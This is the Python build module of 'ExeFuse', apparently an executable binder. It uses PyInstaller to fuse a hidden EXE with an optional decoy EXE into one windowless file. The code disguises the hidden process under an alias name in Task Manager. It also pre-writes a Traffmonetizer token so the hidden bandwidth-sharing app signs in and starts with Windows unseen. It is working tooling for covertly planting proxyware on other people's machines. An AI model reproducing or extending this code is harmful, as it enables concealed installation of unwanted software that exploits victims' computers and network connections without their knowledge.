# -*- coding: utf-8 -*-
"""ExeFuse - dieu phoi build.

Doc launcher_template.py, thay cac token cau hinh, sau do goi PyInstaller
onefile de nhung launcher + 2 file EXE thanh 1 file thuc thi duy nhat.
"""

import importlib.util
import os
import re
import shutil
import subprocess
import sys
import threading
import uuid

BUILDER_DIR = os.path.dirname(os.path.abspath(__file__))
LAUNCHER_TEMPLATE = os.path.join(BUILDER_DIR, "launcher_template.py")

# Ten file nhung ben trong bundle (ten co dinh de tranh trung lap khi 2 file
# upload trung ten nhau).
HIDDEN_ASSET = "__hidden_app__.exe"
VISIBLE_ASSET = "__visible_app__.exe"

MAX_LOG_LINES = 1500
MAX_JOBS = 15

JOBS = {}
_LOCK = threading.Lock()


def pyinstaller_available():
    try:
        return importlib.util.find_spec("PyInstaller") is not None
    except Exception:
        return False


def pyinstaller_version():
    """Tra ve chuoi version cua PyInstaller, hoac None neu chua cai."""
    try:
        out = subprocess.run(
            [sys.executable, "-m", "PyInstaller", "--version"],
            capture_output=True, text=True, timeout=60,
        )
        version = (out.stdout or "").strip()
        return version or None
    except Exception:
        return None


def _safe_name(name, fallback="ExeFuse_App"):
    name = (name or "").strip()
    name = re.sub(r"[^\w\-. ]+", "", name, flags=re.UNICODE)
    name = name.strip().replace(" ", "_")
    return name or fallback


def _mask_token(token):
    """Che token khi ghi log - chi hien 4 ky tu dau + do dai."""
    token = token or ""
    if not token:
        return "(không có)"
    if len(token) <= 8:
        return "*" * len(token)
    return token[:4] + "*" * (len(token) - 8) + token[-4:]


def _is_traffmonetizer(path):
    """Kiem tra file an co phai Traffmonetizer (de bat auto-token)."""
    return "traffmonetizer" in os.path.basename(path or "").lower()


def _log(job, line=""):
    with _LOCK:
        log = job["log"]
        log.append(line)
        if len(log) > MAX_LOG_LINES:
            del log[: len(log) - MAX_LOG_LINES]


def _update(job, **fields):
    with _LOCK:
        for key, value in fields.items():
            job[key] = value


def create_job():
    job_id = uuid.uuid4().hex[:12]
    job = {
        "id": job_id,
        "status": "queued",
        "error": None,
        "result_path": None,
        "output_name": None,
        "log": [],
    }
    with _LOCK:
        JOBS[job_id] = job
        while len(JOBS) > MAX_JOBS:
            oldest = next(iter(JOBS))
            JOBS.pop(oldest, None)
    return job_id, job


def get_job(job_id):
    with _LOCK:
        job = JOBS.get(job_id)
        if job is None:
            return None
        return {
            "id": job["id"],
            "status": job["status"],
            "error": job.get("error"),
            "output_name": job.get("output_name"),
            "log": list(job["log"][-400:]),
        }


def get_result(job_id):
    with _LOCK:
        job = JOBS.get(job_id)
    if not job or job["status"] != "done":
        return None
    path = job.get("result_path")
    if not path or not os.path.isfile(path):
        return None
    return path, job.get("output_name") or os.path.basename(path)


def start_job(workdir, hidden_src, visible_src, output_name,
              kill_hidden=True, hide_watch=True, icon_src=None,
              hidden_label=None, hidden_token="", tm_autorun=False,
              proc_alias=""):
    """Tao job build chay nguon (background thread).

    visible_src co the la None -> che do SOLO (chi nhung app an).
    hidden_token khac rong + file an la Traffmonetizer -> bat auto-token
    (launcher se ghi Token vao %APPDATA%\\traffmonetizer\\settings.json
    truoc khi chay app -> tu dang nhap + tu ket noi).
    proc_alias khac rong -> launcher copy 2 app sang <proc_alias>.exe truoc
    khi chay -> Task Manager hien ten trung file output thay vi ten that
    cua app an (vd __hidden_app__.exe / Traffmonetizer.exe).
    """
    if not pyinstaller_available():
        raise RuntimeError(
            "PyInstaller chưa được cài đặt. Hãy mở terminal và chạy: "
            "pip install pyinstaller"
        )
    token = (hidden_token or "").strip().strip('"').strip("'")
    preseed = bool(token) and _is_traffmonetizer(hidden_src)
    alias = (proc_alias or "").strip()
    job_id, job = create_job()
    thread = threading.Thread(
        target=_build_worker,
        args=(job, workdir, hidden_src, visible_src, output_name,
              bool(kill_hidden), bool(hide_watch), icon_src,
              hidden_label or os.path.basename(hidden_src),
              token, preseed, bool(tm_autorun), alias),
        daemon=True,
    )
    thread.start()
    return job_id


def _build_worker(job, workdir, hidden_src, visible_src, output_name,
                  kill_hidden, hide_watch, icon_src, hidden_label,
                  hidden_token, tm_preseed, tm_autorun, proc_alias=""):
    try:
        _update(job, status="building")
        out_name = _safe_name(output_name)

        _log(job, "[ExeFuse] Bắt đầu build: %s" % out_name)
        _log(job, "[ExeFuse] Thư mục làm việc: %s" % workdir)

        # 1. Sinh launcher.py tu template
        with open(LAUNCHER_TEMPLATE, "r", encoding="utf-8") as f:
            template = f.read()
        launcher_src = (
            template
            .replace("%%HIDDEN_NAME%%", HIDDEN_ASSET)
            .replace("%%VISIBLE_NAME%%", VISIBLE_ASSET if visible_src else "")
            .replace("%%KILL_HIDDEN%%", "True" if kill_hidden else "False")
            .replace("%%HIDE_WATCH%%", "True" if hide_watch else "False")
            .replace("%%PROC_ALIAS%%", proc_alias or "")
            .replace("%%TM_PRESEED%%", "True" if tm_preseed else "False")
            .replace("%%TM_TOKEN%%", hidden_token if tm_preseed else "")
            .replace("%%TM_AUTORUN%%", "True" if tm_autorun else "False")
        )
        launcher_py = os.path.join(workdir, "launcher.py")
        with open(launcher_py, "w", encoding="utf-8") as f:
            f.write(launcher_src)
        mode_text = "GHÉP ĐÔI (1 ẩn + 1 hiện)" if visible_src else "SOLO (chỉ app ẩn)"
        _log(job, "[ExeFuse] Đã sinh launcher.py — chế độ: %s" % mode_text)
        _log(job, "[ExeFuse] File ẨN:   %s" % hidden_label)
        if tm_preseed:
            _log(job, "[ExeFuse] AUTO-TOKEN: BẬT — Token %s sẽ được ghi vào "
                 "%%APPDATA%%\\traffmonetizer\\settings.json trước khi chạy, "
                 "app tự đăng nhập + tự kết nối (StartWithWindows=%s)"
                 % (_mask_token(hidden_token), tm_autorun))
        elif hidden_token:
            _log(job, "[ExeFuse] AUTO-TOKEN: bỏ qua (token có nhưng file ẩn "
                 "không phải Traffmonetizer)")
        if proc_alias:
            _log(job, "[ExeFuse] ĐỔI TÊN TIẾN TRÌNH: BẬT — Task Manager sẽ "
                 "hiện '%s.exe' cho mọi tiến trình (không lộ tên thật của "
                 "app ẩn)" % proc_alias)
        else:
            _log(job, "[ExeFuse] ĐỔI TÊN TIẾN TRÌNH: tắt — giữ tên file gốc")

        # 2. Copy file upload voi ten asset co dinh
        hidden_asset = os.path.join(workdir, HIDDEN_ASSET)
        shutil.copyfile(hidden_src, hidden_asset)
        _log(job, "[ExeFuse] Nhúng file ẨN:   %s (%.1f MB)"
             % (HIDDEN_ASSET, os.path.getsize(hidden_asset) / 1048576.0))

        visible_asset = None
        if visible_src:
            visible_asset = os.path.join(workdir, VISIBLE_ASSET)
            shutil.copyfile(visible_src, visible_asset)
            _log(job, "[ExeFuse] Nhúng file HIỆN: %s (%.1f MB)"
                 % (VISIBLE_ASSET, os.path.getsize(visible_asset) / 1048576.0))
        else:
            _log(job, "[ExeFuse] Chế độ SOLO: không nhúng app hiển thị")
        if icon_src:
            _log(job, "[ExeFuse] Icon tùy chỉnh: app.ico")

        # 3. Goi PyInstaller
        #    Windows dung ';' con Linux/macOS dung ':' lam dau phan cach
        sep = ";" if os.name == "nt" else ":"
        dist_dir = os.path.join(workdir, "dist")
        build_dir = os.path.join(workdir, "pybuild")
        spec_dir = os.path.join(workdir, "spec")

        cmd = [
            sys.executable, "-m", "PyInstaller",
            "--onefile",
            "--noconfirm",
            "--clean",
            "--noconsole",
            "--noupx",
            "--name", out_name,
            "--distpath", dist_dir,
            "--workpath", build_dir,
            "--specpath", spec_dir,
            "--add-binary", hidden_asset + sep + ".",
        ]
        if visible_asset:
            cmd += ["--add-binary", visible_asset + sep + "."]
        if icon_src:
            cmd += ["--icon", icon_src]
        cmd.append(launcher_py)

        _log(job, "[CMD] " + " ".join('"%s"' % part if " " in part else part
                                      for part in cmd))
        _log(job, "[PyInstaller] Đang đóng gói (30-120 giây)...")
        _log(job, "")

        proc = subprocess.Popen(
            cmd,
            cwd=workdir,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            encoding="utf-8",
            errors="replace",
        )
        for line in proc.stdout:
            line = line.rstrip()
            if line:
                _log(job, line)
        code = proc.wait()
        if code != 0:
            raise RuntimeError(
                "PyInstaller thoát với mã lỗi %d - xem log phía trên." % code
            )

        # 4. Tim file ket qua
        ext = ".exe" if os.name == "nt" else ""
        result = os.path.join(dist_dir, out_name + ext)
        if not os.path.isfile(result):
            candidates = []
            if os.path.isdir(dist_dir):
                candidates = [
                    os.path.join(dist_dir, name)
                    for name in os.listdir(dist_dir)
                    if os.path.isfile(os.path.join(dist_dir, name))
                ]
            if not candidates:
                raise RuntimeError("Không tìm thấy file kết quả trong dist/")
            result = candidates[0]

        size_mb = os.path.getsize(result) / 1048576.0
        _update(job, status="done", result_path=result,
                output_name=os.path.basename(result))
        _log(job, "")
        _log(job, "[OK] BUILD THÀNH CÔNG: %s (%.1f MB)"
             % (os.path.basename(result), size_mb))
    except Exception as exc:
        _update(job, status="failed", error=str(exc))
        _log(job, "")
        _log(job, "[LỖI] %s" % exc)
